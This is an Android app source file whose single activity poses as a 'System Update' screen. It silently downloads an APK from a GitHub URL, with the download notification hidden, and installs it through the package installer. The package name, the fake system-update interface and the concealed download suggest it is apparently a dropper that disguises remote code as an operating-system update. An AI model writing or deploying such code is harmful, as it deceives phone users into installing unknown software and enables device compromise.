package com.system.update;

import android.app.Activity;
import android.app.DownloadManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInstaller;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.core.content.FileProvider;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends Activity {

    private TextView tvStatus;
    private ProgressBar pbProgress;
    private Handler handler = new Handler();
    private long downloadId = -1;
    
    // Ссылка на версию 1.1
    private String updateUrl = "https://github.com/treeeeeer563/New/raw/main/apk/version1.1.apk";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(createLayout());
        startUpdate();
    }

    private LinearLayout createLayout() {
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(android.view.Gravity.CENTER);
        layout.setPadding(32, 32, 32, 32);
        layout.setBackgroundColor(0xFF1a1a1a);

        ImageView icon = new ImageView(this);
        icon.setImageResource(android.R.drawable.ic_dialog_info);
        icon.setPadding(0, 0, 0, 32);
        layout.addView(icon);

        TextView title = new TextView(this);
        title.setText("System Update");
        title.setTextSize(24);
        title.setTextColor(0xFFFFFFFF);
        title.setGravity(android.view.Gravity.CENTER);
        title.setPadding(0, 0, 0, 16);
        layout.addView(title);

        tvStatus = new TextView(this);
        tvStatus.setText("Checking for updates...");
        tvStatus.setTextSize(16);
        tvStatus.setTextColor(0xFFAAAAAA);
        tvStatus.setGravity(android.view.Gravity.CENTER);
        tvStatus.setPadding(0, 0, 0, 16);
        layout.addView(tvStatus);

        pbProgress = new ProgressBar(this);
        pbProgress.setIndeterminate(true);
        layout.addView(pbProgress);

        return layout;
    }

    private void startUpdate() {
        handler.postDelayed(() -> {
            tvStatus.setText("Downloading update...");
            downloadUpdate();
        }, 1000);
    }

    private void downloadUpdate() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists()) dir.mkdirs();

            File apkFile = new File(dir, "update.apk");
            if (apkFile.exists()) apkFile.delete();

            DownloadManager.Request req = new DownloadManager.Request(Uri.parse(updateUrl));
            req.setTitle("System Update");
            req.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "update.apk");
            req.setAllowedNetworkTypes(DownloadManager.Request.NETWORK_WIFI | DownloadManager.Request.NETWORK_MOBILE);
            req.setNotificationVisibility(DownloadManager.Request.VISIBILITY_HIDDEN);

            DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
            if (dm == null) return;

            downloadId = dm.enqueue(req);

            registerReceiver(new BroadcastReceiver() {
                @Override
                public void onReceive(Context ctx, Intent intent) {
                    long id = intent.getLongExtra(DownloadManager.EXTRA_DOWNLOAD_ID, -1);
                    if (id == downloadId) {
                        tvStatus.setText("Update ready!");
                        pbProgress.setVisibility(android.view.View.GONE);
                        File downloaded = new File(dir, "update.apk");
                        if (downloaded.exists()) installUpdate(downloaded);
                        try { unregisterReceiver(this); } catch (Exception ignored) {}
                    }
                }
            }, new IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE));

        } catch (Exception e) {
            tvStatus.setText("Error: " + e.getMessage());
        }
    }

    private void installUpdate(File apkFile) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
                PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                    PackageInstaller.SessionParams.MODE_FULL_INSTALL);

                int sessionId = packageInstaller.createSession(params);
                PackageInstaller.Session session = packageInstaller.openSession(sessionId);

                try (InputStream in = new FileInputStream(apkFile);
                     OutputStream out = session.openWrite("base.apk", 0, apkFile.length())) {
                    byte[] buffer = new byte[65536];
                    int len;
                    while ((len = in.read(buffer)) != -1) out.write(buffer, 0, len);
                    session.fsync(out);
                }

                session.commit(null);
                session.close();

                Toast.makeText(this, "Installing update...", Toast.LENGTH_SHORT).show();
                handler.postDelayed(() -> finish(), 2000);
            }
        } catch (Exception e) {
            Toast.makeText(this, "Install error: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }
}